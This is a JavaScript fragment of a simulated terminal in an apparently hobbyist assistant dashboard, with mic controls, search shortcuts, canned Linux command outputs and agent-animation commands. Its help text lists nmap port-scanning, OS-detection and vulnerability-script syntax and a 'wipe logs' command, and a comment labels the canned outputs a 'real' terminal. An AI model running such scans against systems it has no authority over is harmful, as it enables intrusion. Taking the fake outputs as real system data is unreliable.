    };

    // Initial state reflection
    updateKnobUI(isMicActive());

    const setMutedState = async (mute) => {
      if (!window.FridayVoice) return;
      if (mute) {
        await window.FridayVoice.setMicMuted(true);
        if (window.FridayAudio) window.FridayAudio.playMicOff();
        this.showToast('Microphone Access: COMPLETELY BLOCKED');
        updateKnobUI(false);
      } else {
        await window.FridayVoice.setMicMuted(false);
        if (window.FridayAudio) window.FridayAudio.playClick();
        this.showToast('Microphone Access: RESTORED & ARMED');
        updateKnobUI(true);
      }
    };

    const toggleMute = () => {
      const active = isMicActive();
      setMutedState(active);
    };

    // Drag / Swipe pointer events
    const onPointerDown = (e) => {
      isDragging = true;
      startX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
      dragDist = 0;
      knob.classList.add('dragging');
      try { knob.setPointerCapture(e.pointerId); } catch (err) {}
    };

    const onPointerMove = (e) => {
      if (!isDragging) return;
      const clientX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
      const deltaX = clientX - startX;
      dragDist = Math.abs(deltaX);

      const trackRect = track.getBoundingClientRect();
      const knobRect = knob.getBoundingClientRect();
      const maxTravel = Math.max(1, trackRect.width - knobRect.width - 6);

      const active = isMicActive();
      let candidateX = active ? (maxTravel + deltaX) : deltaX;
      candidateX = Math.max(0, Math.min(maxTravel, candidateX));

      knob.style.transform = `translateX(${candidateX}px)`;
      knob.style.transition = 'none';

      if (label) {
        const ratio = candidateX / maxTravel;
        label.textContent = ratio < 0.45 ? 'RELEASE TO BLOCK ◄' : 'RELEASE TO GRANT ►';
      }
    };

    const onPointerUp = (e) => {
      if (!isDragging) return;
      isDragging = false;
      knob.classList.remove('dragging');
      knob.style.transition = '';
      try { knob.releasePointerCapture(e.pointerId); } catch (err) {}

      // If user tapped without dragging, toggle immediately
      if (dragDist < 6) {
        toggleMute();
        return;
      }

      const trackRect = track.getBoundingClientRect();
      const knobRect = knob.getBoundingClientRect();
      const maxTravel = Math.max(1, trackRect.width - knobRect.width - 6);
      const active = isMicActive();
      const deltaX = (e.clientX || 0) - startX;
      let finalX = active ? (maxTravel + deltaX) : deltaX;
      finalX = Math.max(0, Math.min(maxTravel, finalX));
      const ratio = finalX / maxTravel;

      if (ratio > 0.5) {
        setMutedState(false);
      } else {
        setMutedState(true);
      }
    };

    knob.addEventListener('pointerdown', onPointerDown);
    knob.addEventListener('pointermove', onPointerMove);
    knob.addEventListener('pointerup', onPointerUp);
    knob.addEventListener('pointercancel', onPointerUp);

    // Track click fallback
    track.addEventListener('click', (e) => {
      if (dragDist >= 6) return;
      if (e.target !== knob && !knob.contains(e.target)) {
        toggleMute();
      }
    });

    // Keyboard support
    track.addEventListener('keydown', (e) => {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        toggleMute();
      } else if (e.key === 'ArrowLeft' || e.key === 'ArrowDown') {
        e.preventDefault();
        setMutedState(true);
      } else if (e.key === 'ArrowRight' || e.key === 'ArrowUp') {
        e.preventDefault();
        setMutedState(false);
      }
    });
  }

  submitInput() {
    if (!this.inputEl) return;
    const val = this.inputEl.value;
    if (!val.trim()) {
      this.printCommand('');
      this.inputEl.value = '';
      if (this.terminalEl) this.terminalEl.scrollTop = this.terminalEl.scrollHeight;
      return;
    }

    this.inputEl.value = '';
    this.executeLinuxCommand(val.trim());
  }

  processUserInput(userInput, fromVoice = false) {
    if (!userInput) return;
    if (fromVoice) {
      this.processVoiceInput(userInput);
    } else {
      this.executeLinuxCommand(userInput, false);
    }
  }

  tokenize(str) {
    const tokens = [];
    let curr = '';
    let inQuote = null;
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      if (ch === '"' || ch === "'") {
        if (inQuote === ch) {
          inQuote = null;
        } else if (!inQuote) {
          inQuote = ch;
        } else {
          curr += ch;
        }
      } else if (/\s/.test(ch) && !inQuote) {
        if (curr.length > 0) {
          tokens.push(curr);
          curr = '';
        }
      } else {
        curr += ch;
      }
    }
    if (curr.length > 0) tokens.push(curr);
    return tokens;
  }

  // Real Linux Terminal & Command Execution Engine
  executeLinuxCommand(cmdLine) {
    const raw = cmdLine.trim();
    if (!raw) {
      this.printCommand('');
      return;
    }

    this.cmdHistory.push(raw);
    this.historyIndex = this.cmdHistory.length;

    this.printCommand(raw);
    if (window.FridayAudio) window.FridayAudio.playClick();

    // Check for file redirection >> or >
    let redirectType = null;
    let redirectTarget = null;
    let commandToRun = raw;

    if (raw.includes('>>')) {
      const idx = raw.indexOf('>>');
      commandToRun = raw.slice(0, idx).trim();
      redirectTarget = raw.slice(idx + 2).trim();
      redirectType = 'append';
    } else if (raw.includes('>')) {
      const idx = raw.indexOf('>');
      commandToRun = raw.slice(0, idx).trim();
      redirectTarget = raw.slice(idx + 1).trim();
      redirectType = 'overwrite';
    }

    // Check for pipeline |
    if (commandToRun.includes('|')) {
      const stages = commandToRun.split('|').map(s => s.trim()).filter(Boolean);
      this.lastPipeInput = '';
      for (let i = 0; i < stages.length; i++) {
        let captured = '';
        const origPrint = this.printStdout.bind(this);
        this.printStdout = (t) => {
          captured += (captured ? '\n' : '') + t.toString().replace(/<[^>]+>/g, '');
        };
        try {
          this.executeSingleCommand(stages[i]);
        } finally {
          this.printStdout = origPrint;
        }
        this.lastPipeInput = captured;
      }

      if (redirectType && redirectTarget) {
        this.saveToFile(redirectTarget, this.lastPipeInput, redirectType === 'append');
      } else if (this.lastPipeInput) {
        this.printStdout(this.lastPipeInput);
      }
      this.lastPipeInput = '';
      return;
    }

    // Direct redirection execution
    if (redirectType && redirectTarget) {
      let captured = '';
      const origPrint = this.printStdout.bind(this);
      this.printStdout = (t) => {
        captured += (captured ? '\n' : '') + t.toString().replace(/<[^>]+>/g, '');
      };
      try {
        this.executeSingleCommand(commandToRun);
      } finally {
        this.printStdout = origPrint;
      }
      this.saveToFile(redirectTarget, captured, redirectType === 'append');
      return;
    }

    this.executeSingleCommand(commandToRun);
  }

  executeSingleCommand(cmdLine) {
    let raw = cmdLine.trim();
    if (!raw) return;

    // Check alias replacement on first word
    const firstWord = raw.split(/\s+/)[0].toLowerCase();
    if (this.aliases && this.aliases[firstWord]) {
      raw = this.aliases[firstWord] + raw.slice(firstWord.length);
    }

    const parts = this.tokenize(raw);
    const cmd = (parts[0] || '').toLowerCase();
    const args = parts.slice(1);
    const query = args.join(' ');

    // ==========================================
    // 1. Search Engines (Google, DuckDuckGo, Wikipedia, Bing, Brave)
    // ==========================================
    if (cmd === 'google' || cmd === 'search') {
      if (!query) {
        this.printStdout('Usage: google <search query>');
        return;
      }
      const url = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
      window.open(url, '_blank');
      this.printStdout(`🔍 Google Search initiated for: "<span class="t-highlight">${this.escapeHTML(query)}</span>"\n🔗 Target: <a href="${url}" target="_blank" class="term-link">${url}</a>`, true);
      return;
    }

    if (cmd === 'duck' || cmd === 'ddg') {
      if (!query) {
        this.printStdout('Usage: duck <search query>');
        return;
      }
      const url = `https://duckduckgo.com/?q=${encodeURIComponent(query)}`;
      window.open(url, '_blank');
      this.printStdout(`🦆 DuckDuckGo Search initiated for: "<span class="t-highlight">${this.escapeHTML(query)}</span>"\n🔗 Target: <a href="${url}" target="_blank" class="term-link">${url}</a>`, true);
      return;
    }

    if (cmd === 'wiki' || cmd === 'wikipedia') {
      if (!query) {
        this.printStdout('Usage: wiki <topic>');
        return;
      }
      const url = `https://en.wikipedia.org/wiki/Special:Search?search=${encodeURIComponent(query)}`;
      window.open(url, '_blank');
      this.printStdout(`📖 Wikipedia Search initiated for: "<span class="t-highlight">${this.escapeHTML(query)}</span>"\n🔗 Target: <a href="${url}" target="_blank" class="term-link">${url}</a>`, true);
      return;
    }

    if (cmd === 'bing') {
      if (!query) {
        this.printStdout('Usage: bing <search query>');
        return;
      }
      const url = `https://www.bing.com/search?q=${encodeURIComponent(query)}`;
      window.open(url, '_blank');
      this.printStdout(`🌐 Bing Search opened: <a href="${url}" target="_blank" class="term-link">${url}</a>`, true);
      return;
    }

    if (cmd === 'brave') {
      if (!query) {
        this.printStdout('Usage: brave <search query>');
        return;
      }
      const url = `https://search.brave.com/search?q=${encodeURIComponent(query)}`;
      window.open(url, '_blank');
      this.printStdout(`🦁 Brave Search opened: <a href="${url}" target="_blank" class="term-link">${url}</a>`, true);
      return;
    }

    // ==========================================
    // 2. Linux System, Filesystem & Diagnostic Commands
    // ==========================================
    if (cmd === 'clear' || cmd === 'cls') {
      this.clearTerminal();
      return;
    }

    if (cmd === 'help' || cmd === 'man') {
      const helpText = `
<span class="t-highlight">GOJO OS v8.4.2 LINUX COMMAND MATRIX</span>
───────────────────────────────────────────────────────────────────
<span style="color:#00ff9d; font-weight:bold;">📁 FILE SYSTEM:</span>
  ls [-la]              List directory contents & permissions
  pwd                   Print current working directory
  cd &lt;dir&gt;              Change directory (~, .., /home/gojo, /assets)
  cat &lt;file&gt;            Display file contents (package.json, README.md)
  mkdir &lt;dir&gt;           Create new directory
  touch &lt;file&gt;          Create empty file
  rm &lt;file&gt;             Remove file

<span style="color:#ffbd2e; font-weight:bold;">⚙️ SYSTEM & TELEMETRY:</span>
  whoami                Display current user (gojo)
  uname -a              Print Linux kernel & architecture
  uptime                Display system running time & load
  date                  Display current system date & timestamp
  echo &lt;text&gt;           Print text or variables ($USER, $FOUNDER, $SHELL)
  ps / top              Display active system processes
  ping &lt;host&gt;           Ping network host or orbital satellite
  curl &lt;url&gt;            HTTP probe simulation
  neofetch / fastfetch  Display ASCII system hardware & OS badge
  history               Display command execution history
  mic [status|on|off]   Control & inspect full system microphone hardware

<span style="color:#ff3366; font-weight:bold;">👑 ROOT / SUPERUSER SYSTEM COMMANDS:</span>
  whoami                Display active user context (root / gojo)
  id                    Display UID, GID, and Ring-0 security credentials
  su [root|gojo]        Switch user context to root or gojo
  sudo &lt;command&gt;         Execute command with unrestricted root elevation
  chmod &lt;mode&gt; &lt;file&gt;   Set filesystem permissions (rwxrwxrwx)
  chown &lt;owner&gt; &lt;file&gt;  Set file ownership
  systemctl [status]    Manage tactical systemd services
  dmesg                 Inspect Ring-0 kernel boot diagnostic buffer
  iptables -L           Inspect defense network firewall rules
  sysctl -a             Inspect kernel tuning matrix

<span style="color:#00f0ff; font-weight:bold;">🌐 SEARCH ENGINES:</span>
  google &lt;query&gt;        Search Google in new tab
  duck &lt;query&gt;          Search DuckDuckGo in new tab
  wiki &lt;query&gt;          Search Wikipedia archive
  bing &lt;query&gt;          Search Bing
  brave &lt;query&gt;         Search Brave Search

<span style="color:#00ff9d; font-weight:bold;">🔍 NMAP NETWORK AUDIT & PORT DISCOVERY:</span>
  nmap &lt;target&gt;          Port scan target IP, range, or hostname
  nmap -sV &lt;target&gt;      Probe open ports for service / version banners
  nmap -O &lt;target&gt;       Detect target Operating System kernel & CPE
  nmap -A &lt;target&gt;       Aggressive audit (OS, versions, scripts, traceroute)
  nmap -p &lt;ports&gt; &lt;tgt&gt;  Audit specific ports (-p 80,443 or -p 1-65535 or -F)
  nmap -sn &lt;subnet&gt;      Ping sweep host discovery on subnet (192.168.1.0/24)
  nmap --script &lt;cat&gt;    Execute NSE scripts (--script vuln, default, ssl-cert)
  nmap -oN &lt;file&gt; &lt;tgt&gt;  Save scan output report to virtual file system
  nmap --help            Display authentic Nmap 7.94 manual & syntax

<span style="color:#38bdf8; font-weight:bold;">🛡️ BLUE TEAM CYBER DEFENSE (A-poc/BlueTeam-Tools):</span>
  blueteam / bt         Display Blue Team defense banner & overview
  blueteam tools [cat]  List 75+ tools across 13 defensive domains
  blueteam hunt &lt;tgt&gt;   Threat hunting telemetry & intelligence pivots
  blueteam ioc &lt;text&gt;   Extract & defang IOCs live (IP, domain, hash, URL)
  blueteam scan &lt;ip&gt;    Network mapping & vulnerability attack surface sweep
  blueteam ir           NIST SP 800-61 Incident Response & Ransomware Playbook
  blueteam yara &lt;name&gt;  Generate production-ready YARA detection rule
  blueteam lolbas [bin] Living-off-the-land evasion & detection vectors
  blueteam tips         5 high-impact blue team defense & extraction tips

<span style="color:#00f0ff; font-weight:bold;">3D AI AGENTS ORCHESTRATION & CABINS:</span>
  agents [list]         List all 18 specialist AI agents (AGENT-01 to AGENT-18)
  agents status         Fleet overview & FRIDEY Brain orchestration metrics
  agents assign <id> <task> Assign mission to agent (1-18)
  agents collab <id1> <id2> Pair two agents in dynamic collaboration (laser data bus)
  agents walk <id>      Trigger walking animation along hallway circuit
  agents work <id>      Trigger active typing/working animation at desk
  agents laptop <id>    Trigger laptop handling & screen tilt animation
  agents inspect <id>   Open 3D cabin inspection & gear modal
  agents dispatch       Auto-dispatch coordinated missions to all 18 agents
  agents dept <name>    Filter by department (coding | security | analytics | ops)

<span style="color:#ff5f56; font-weight:bold;">🛡️ FRIDEY TACTICAL PROTOCOLS:</span>
  houseparty            Initiate House Party defense fleet
  veronica              Deploy orbital Hulkbuster satellite cradle
  combat                Engage combat repulsor HUD mode
  stealth               Activate radar dampening optical stealth
  cleanslate            Wipe logs & reinitialize neural matrix
  surge                 Overcharge Arc Reactor to 4.12+ GW
  diagnostics           Run full system diagnostics sweep
───────────────────────────────────────────────────────────────────`;
      this.printStdout(helpText, true);
      return;
    }

    if (cmd === 'neofetch' || cmd === 'fastfetch') {
      const neofetchArt = `
<pre style="color:var(--theme-primary); font-family:inherit; line-height:1.25;">
        /\\          <span style="color:#fff; font-weight:bold;">gojo@fridey-os</span>
       /  \\         <span style="color:#888;">--------------</span>
      / /\\ \\        <span style="color:#00ff9d;">OS:</span> GOJO OS v8.4.2 Linux (aarch64)
     / /__\\ \\       <span style="color:#00ff9d;">Host:</span> Gojo Technologes Hub
    / /____\\ \\      <span style="color:#00ff9d;">Kernel:</span> 6.8.0-gojo-arm64
   /_/      \\_\\     <span style="color:#00ff9d;">Uptime:</span> 2 hours, 18 mins
                    <span style="color:#00ff9d;">Shell:</span> bash 5.2.26 / zsh 5.9
                    <span style="color:#00ff9d;">Theme:</span> STARK CYAN (Glassmorphic)
                    <span style="color:#00ff9d;">CPU:</span> Apple M4 (8 Cores)
                    <span style="color:#00ff9d;">Arc Reactor:</span> ${this.telemetry.arcOutput} GW [ONLINE]
                    <span style="color:#00ff9d;">Memory:</span> 1.4 GiB / 16.0 GiB (91%)
                    <span style="color:#00ff9d;">Founder & Creator:</span> <span style="color:#fff; font-weight:bold;">GOJO</span>
</pre>`;
      this.printStdout(neofetchArt, true);
      return;
    }

    if (cmd === 'whoami') {
      this.printStdout(this.currentUser);
      return;
    }

    if (cmd === 'id') {
      if (this.isRoot) {
        this.printStdout('uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),10(wheel),999(quantum-root)');
      } else {
        this.printStdout('uid=1000(gojo) gid=1000(gojo) groups=1000(gojo),4(adm),10(wheel),27(sudo)');
      }
      return;
    }

    if (cmd === 'uname') {
      if (args.includes('-a')) {
        this.printStdout('Linux fridey-os 6.8.0-gojo-arm64 #1 SMP PREEMPT Wed Oct 22 10:00:00 IST 2026 aarch64 GNU/Linux');
      } else {
        this.printStdout('Linux');
      }
      return;
    }

    if (cmd === 'pwd') {
      this.printStdout(this.currentDir);
      return;
    }

    if (cmd === 'date') {
      const d = new Date();
      this.printStdout(d.toString());
      return;
    }

    if (cmd === 'uptime') {
      this.printStdout(` 11:38:14 up 2:18, 1 user, load average: 1.42, 1.85, 2.01`);
      return;
    }

    if (cmd === 'echo') {
      let out = query;
      // Expand exit code $? before resetting
      out = out.replace(/\$\?/g, String(this.lastExitCode));
      // Expand specific variables
      out = out.replace(/\$USER/g, this.currentUser);
      out = out.replace(/\$FOUNDER/g, 'GOJO');
      out = out.replace(/\$HOME/g, this.isRoot ? '/root' : '/home/gojo');
      out = out.replace(/\$SHELL/g, '/bin/bash');
      out = out.replace(/\$PWD/g, this.currentDir);
      out = out.replace(/\$ARC_POWER/g, `${this.telemetry.arcOutput} GW`);
      out = out.replace(/\$PRIVILEGE/g, this.isRoot ? 'ROOT:RING-0' : 'USER:STANDARD');
      // Expand generic environment variables from this.env
      if (this.env) {
        out = out.replace(/\$([A-Za-z0-9_]+)/g, (match, vName) => {
          return this.env[vName] !== undefined ? this.env[vName] : match;
        });
      }
      this.printStdout(out);
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'history') {
      let histOutput = this.cmdHistory.map((h, i) => `  ${(i + 1).toString().padStart(3, ' ')}  ${this.escapeHTML(h)}`).join('\n');
      this.printStdout(histOutput);
      return;
    }

    if (cmd === 'ps' || cmd === 'top' || cmd === 'htop') {
      const u = this.isRoot ? 'root' : 'gojo';
      const psOutput = `
<pre style="color:#d1d5db; font-family:inherit;">
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 ${u.padEnd(9, ' ')} 20   0  168420  11420   8320 S   0.0   0.1   0:01.04 systemd [root]
   42 ${u.padEnd(9, ' ')} 20   0  894210  42100  18200 S   4.2   1.8   0:14.32 fridey-neural
  128 ${u.padEnd(9, ' ')} 20   0  341200  28400  12100 S   1.8   0.9   0:06.12 arc-telemetry
  256 ${u.padEnd(9, ' ')} 20   0  412800  32100  14500 S   0.8   0.5   0:03.45 vocal-hardware
  512 ${u.padEnd(9, ' ')} 20   0   18420   4210   3120 S   0.1   0.2   0:00.22 bash (ring-0)
</pre>`;
      this.printStdout(psOutput, true);
      return;
    }

    if (cmd === 'cd') {
      const target = args[0] || '~';
      const home = this.isRoot ? '/root' : '/home/gojo';
      if (target === '~' || target === home || target === '') {
        this.currentDir = home;
      } else if (target === '/') {
        this.currentDir = '/';
      } else if (target === '..') {
        if (this.currentDir !== '/') {
          const segs = this.currentDir.split('/').filter(Boolean);
          segs.pop();
          this.currentDir = segs.length === 0 ? '/' : '/' + segs.join('/');
        }
      } else {
        const potential = target.startsWith('/') ? target : (this.currentDir === '/' ? '/' + target : this.currentDir + '/' + target);
        if (this.vfs[potential]) {
          this.currentDir = potential;
        } else {
          this.printStdout(`bash: cd: ${target}: No such file or directory`);
          return;
        }
      }
      this.updatePromptPath();
      return;
    }

    if (cmd === 'ls' || cmd === 'dir') {
      const entries = this.vfs[this.currentDir] || [];
      const showDetails = args.includes('-l') || args.includes('-la') || args.includes('-al');
      if (showDetails) {
        let lines = [`total ${entries.length * 4}`];
        for (const item of entries) {
          const isDir = !item.includes('.');
          const perm = isDir ? 'drwxr-xr-x 2' : '-rw-r--r-- 1';
          const size = isDir ? '4096' : (Math.floor(Math.random() * 8000) + 1024).toString();
          const color = isDir ? '#00b4d8' : (item.endsWith('.sh') || item.endsWith('.js') ? '#00ff9d' : '#ffffff');
          lines.push(`${perm} gojo gojo ${size.padStart(6, ' ')} Oct 22 11:38 <span style="color:${color}; font-weight:bold;">${item}${isDir ? '/' : ''}</span>`);
        }
        this.printStdout(lines.join('\n'), true);
      } else {
        let itemsHtml = entries.map(item => {
          const isDir = !item.includes('.');
          const color = isDir ? '#00b4d8' : (item.endsWith('.sh') || item.endsWith('.js') ? '#00ff9d' : '#ffffff');
          return `<span style="color:${color}; font-weight:bold; margin-right: 18px;">${item}${isDir ? '/' : ''}</span>`;
        }).join('');
        this.printStdout(itemsHtml, true);
      }
      return;
    }

    if (cmd === 'cat') {
      const filename = args[0];
      if (!filename) {
        this.printStdout('Usage: cat <filename>');
        return;
      }
      const fullPath = filename.startsWith('/') ? filename : (this.currentDir === '/' ? '/' + filename : this.currentDir + '/' + filename);
      if (this.fileContents[filename]) {
        this.printStdout(this.escapeHTML(this.fileContents[filename]));
      } else if (this.fileContents[fullPath]) {
        this.printStdout(this.escapeHTML(this.fileContents[fullPath]));
      } else if (filename === 'hosts' || fullPath === '/etc/hosts') {
        this.printStdout('127.0.0.1  localhost\n127.0.0.1  fridey-os\n127.0.0.1  gojo-technologes-hub\n10.0.0.1   veronica-satellite');
      } else if (filename === 'hostname' || fullPath === '/etc/hostname') {
        this.printStdout('Gojo Technologes Hub');
      } else {
        const curItems = this.vfs[this.currentDir] || [];
        if (curItems.includes(filename)) {
          this.printStdout(`[Binary/Encrypted Data Buffer: ${filename}]`);
        } else {
          this.printStdout(`cat: ${filename}: No such file or directory`);
        }
      }
      return;
    }

    if (cmd === 'ping') {
      const host = args[0] || '127.0.0.1';
      this.printStdout(`PING ${host} (${host}): 56 data bytes\n64 bytes from ${host}: icmp_seq=0 ttl=64 time=0.842 ms\n64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.912 ms\n64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.814 ms\n64 bytes from ${host}: icmp_seq=3 ttl=64 time=0.887 ms\n--- ${host} ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 0.814/0.863/0.912/0.038 ms`);
      return;
    }

    if (cmd === 'curl') {
      this.printStdout(`HTTP/1.1 200 OK\nServer: GOJO-OS-HTTP/8.4\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nTelemetry-Sync: Active`);
      return;
    }

    if (cmd === 'mkdir') {
      const dirName = args[0];
      if (!dirName) {
        this.printStdout('Usage: mkdir <directory>');
        return;
      }
      if (!this.vfs[this.currentDir]) this.vfs[this.currentDir] = [];
      if (!this.vfs[this.currentDir].includes(dirName)) {
        this.vfs[this.currentDir].push(dirName);
        this.vfs[this.currentDir + '/' + dirName] = [];
      }
      return;
    }

    if (cmd === 'touch') {
      const fName = args[0];
      if (!fName) {
        this.printStdout('Usage: touch <filename>');
        return;
      }
      if (!this.vfs[this.currentDir]) this.vfs[this.currentDir] = [];
      if (!this.vfs[this.currentDir].includes(fName)) {
        this.vfs[this.currentDir].push(fName);
      }
      return;
    }

    if (cmd === 'rm') {
      const fName = args[0];
      if (!fName) {
        this.printStdout('Usage: rm <filename>');
        return;
      }
      if (this.vfs[this.currentDir]) {
        this.vfs[this.currentDir] = this.vfs[this.currentDir].filter(item => item !== fName);
      }
      return;
    }

    if (cmd === 'reboot') {
      if (this.terminalEl) this.terminalEl.innerHTML = '';
      this.fridayGreeting();
      return;
    }

    if (cmd === 'mic' || cmd === 'microphone') {
      const sub = (args[0] || 'status').toLowerCase();
      const v = window.FridayVoice;

      if (!v) {
        this.printStdout('bash: mic: voice subsystem not loaded');
        return;
      }

      if (sub === 'on' || sub === 'start' || sub === 'listen' || sub === 'unmute' || sub === 'unblock') {
        v.setMicMuted(false);
        this.printStdout('<span style="color:#00ff9d; font-weight:bold;">[MIC ONLINE]</span> System microphone hardware access granted & armed.\\nContinuous mode: ' + (v.continuousListening ? 'ALWAYS-LISTENING' : 'SINGLE-COMMAND'), true);
        return;
      }

      if (sub === 'off' || sub === 'stop' || sub === 'mute' || sub === 'block') {
        v.setMicMuted(true);
        this.printStdout('<span style="color:#ff3366; font-weight:bold;">[MIC BLOCKED]</span> Microphone hardware access completely blocked temporarily. All media stream tracks terminated.', true);
        return;
      }

      if (sub === 'devices' || sub === 'list') {
        v.enumerateInputDevices().then(() => {
          let out = '<span style="color:#00b4d8; font-weight:bold;">AVAILABLE SYSTEM MICROPHONE INPUTS:</span>\\n';
          if (!v.availableAudioInputs || !v.availableAudioInputs.length) {
            out += '  [1] Default System Microphone (Active)\\n';
          } else {
            v.availableAudioInputs.forEach((d, i) => {
              const isCur = v.selectedDeviceId === d.deviceId || (!v.selectedDeviceId && i === 0);
              out += `  [${i + 1}] ${d.label || 'Audio Input Device'} ${isCur ? '<span style="color:#00ff9d;">(ACTIVE)</span>' : ''}\\n`;
            });
          }
          this.printStdout(out.trim(), true);
        });
        return;
      }

      if (sub === 'test') {
        if (!v.isMicHardwareActive) {
          v.initHardwareMic(true).then(() => {
            const level = (v.getMicRmsLevel() * 100).toFixed(1);
            this.printStdout(`<span style="color:#00ff9d;">[MIC TEST]</span> Hardware connected. Acoustic Signal Level: ${level}%`, true);
          });
        } else {
          const level = (v.getMicRmsLevel() * 100).toFixed(1);
          this.printStdout(`<span style="color:#00ff9d;">[MIC TEST]</span> Hardware active. Real-time Acoustic Level: ${level}%`, true);
        }
        return;
      }

      // Default: status
      const devName = v.availableAudioInputs.find(d => d.deviceId === v.selectedDeviceId)?.label || 'Default System Microphone';
      const statusText = `
<span style="color:#00f0ff; font-weight:bold;">SYSTEM MICROPHONE SUBSYSTEM TELEMETRY:</span>
───────────────────────────────────────────────────────────────────
  Access State:       ${v.isMicBlockedTemporarily ? '<span style="color:#ff3366; font-weight:bold;">TEMPORARILY BLOCKED (MEDIA TRACKS TERMINATED)</span>' : '<span style="color:#00ff9d; font-weight:bold;">GRANTED / ACTIVE</span>'}
  Permission:         <span style="color:${v.micPermissionState === 'granted' ? '#00ff9d' : '#ff3366'}; font-weight:bold;">${v.micPermissionState.toUpperCase()}</span>
  Hardware Stream:    ${v.isHardwareMicActive() ? '<span style="color:#00ff9d;">CONNECTED (Web Audio 48kHz)</span>' : '<span style="color:#888;">STANDBY / BLOCKED</span>'}
  Selected Device:    ${devName}
  Listening State:    ${v.isListening ? '<span style="color:#00ff9d; font-weight:bold;">LISTENING</span>' : '<span style="color:#aaa;">IDLE</span>'}
  Continuous Mode:    ${v.continuousListening ? 'ALWAYS-LISTENING (ON)' : 'MANUAL (CLICK-TO-TALK)'}
  Acoustic Level:     ${(v.getMicRmsLevel() * 100).toFixed(1)}% (RMS)
───────────────────────────────────────────────────────────────────
Commands: 'mic on' (grant access), 'mic off' (completely block access), 'mic devices' (list inputs).`;
      this.printStdout(statusText.trim(), true);
      return;
    }

    // ==========================================
    // 3D AI AGENT FLEET & ORCHESTRATION COMMAND
    // ==========================================
    if (cmd === 'agents' || cmd === 'agent' || cmd === 'fleet') {
      const sub = (args[0] || '').toLowerCase();
      const fleet = window.FridayAgents;

      if (!sub || sub === 'list' || sub === 'ls') {
        if (fleet && typeof fleet.getTerminalAgentList === 'function') {
          this.printStdout(fleet.getTerminalAgentList(), true);
        } else {
          this.printStdout('FRIDEY AI Agent Fleet engine standing by. 18 autonomous agents initialized in individual cabins (AGENT-01 to AGENT-18).');
        }
        return;
      }

      if (sub === 'status' || sub === 'telemetry') {
        if (fleet) {
          const activeCount = fleet.agents ? fleet.agents.filter(a => a.status !== 'IDLE').length : 18;
          const avgCpu = fleet.agents ? Math.round(fleet.agents.reduce((acc, a) => acc + a.cpuLoad, 0) / fleet.agents.length) : 74;
          const out = `
<span class="t-highlight">FRIDEY MASTER BRAIN & 18-AGENT FLEET TELEMETRY:</span>
─────────────────────────────────────────────────────────────────
• Master Suite:      AGENT-00 (FRIDEY Apex Executive Suite)
• Total Agents:      18 Autonomous AI Specialists in Individual Glass Cabins
• Active Missions:   ${activeCount} / 18 In-Progress Workflows
• Fleet CPU Load:    ${avgCpu}% Dynamic Workload
• Data-Bus Load:     94.8% Coordinated IPC Telemetry
• Human Animations:  Walking (strides/ripples), Working (typing), Laptop Handling, Collab
• Departments:       4 Active (Coding, Cyber Defense, Deep Analytics, Ops)
• Workstations:      All equipped with custom desks, laptops & glowing monitors
─────────────────────────────────────────────────────────────────
Type 'agents list' for full roster, 'agents collab <id1> <id2>' to pair, or 'agents assign <id> <task>' to dispatch work.`;
          this.printStdout(out.trim(), true);
        }
        return;
      }

      if (sub === 'collab' || sub === 'collaborate' || sub === 'pair') {
        const id1 = args[1];
        const id2 = args[2];
        if (!id1 || !id2) {
          this.printStdout('Usage: agents collab <agent1> <agent2>\nExample: agents collab 1 2');
          return;
        }
        if (fleet && typeof fleet.pairCollaboration === 'function') {
          const ok = fleet.pairCollaboration(id1, id2);
          if (ok) {
            this.printStdout(`COLLABORATION LINK ESTABLISHED: Dynamic neural data laser bus active between Agent ${id1} and Agent ${id2}. Both cabins synced.`, true);
          } else {
            this.printStdout(`Failed to establish collaboration. Ensure both agent IDs (1-18) are valid.`);
          }
        }
        return;
      }

      if (sub === 'walk') {
        const id = args[1];
        if (!id) {
          this.printStdout('Usage: agents walk <agent-id>\nExample: agents walk 4');
          return;
        }
        if (fleet && typeof fleet.setAgentState === 'function') {
          const ok = fleet.setAgentState(id, 'WALKING');
          this.printStdout(ok ? `Agent ${id} initiated walking stride along cyber hallway.` : `Agent ${id} not found.`);
        }
        return;
      }

      if (sub === 'work') {
        const id = args[1];
        if (!id) {
          this.printStdout('Usage: agents work <agent-id>\nExample: agents work 1');
          return;
        }
        if (fleet && typeof fleet.setAgentState === 'function') {
          const ok = fleet.setAgentState(id, 'WORKING');
          this.printStdout(ok ? `Agent ${id} seated at desk: rapid typing & code compilation active.` : `Agent ${id} not found.`);
        }
        return;
      }

      if (sub === 'laptop' || sub === 'handle') {
        const id = args[1];
        if (!id) {
          this.printStdout('Usage: agents laptop <agent-id>\nExample: agents laptop 3');
          return;
        }
        if (fleet && typeof fleet.setAgentState === 'function') {
          const ok = fleet.setAgentState(id, 'LAPTOP_HANDLING');
          this.printStdout(ok ? `Agent ${id} adjusting laptop screen tilt and analyzing telemetry.` : `Agent ${id} not found.`);
        }
        return;
      }

      if (sub === 'assign') {
        const targetId = args[1];
        const taskText = args.slice(2).join(' ');
        if (!targetId || !taskText) {
          this.printStdout('Usage: agents assign <agent-number|id> <task description>\nExample: agents assign 1 "Refactor IPC socket protocol in Rust"');
          return;
        }

        if (fleet) {
          let agent = fleet.agents.find(a => 
            a.id.toLowerCase() === targetId.toLowerCase() ||
            a.code.toLowerCase() === targetId.toLowerCase() ||
            String(a.number) === targetId ||
            ('agent-' + targetId) === a.id ||
            ('agent-0' + targetId) === a.id
          );

          if (!agent && (targetId.toLowerCase() === 'fridey' || targetId === '0')) {
            agent = fleet.masterBrain;
          }

          if (agent) {
            fleet.assignTask(agent.id, taskText);
            this.printStdout(`TASK DISPATCHED: Assigned to <strong>${agent.code}</strong> (${agent.cabin}, ${agent.laptop}):\n   <span style="color:#00f0ff;">"${this.escapeHTML(taskText)}"</span>`, true);
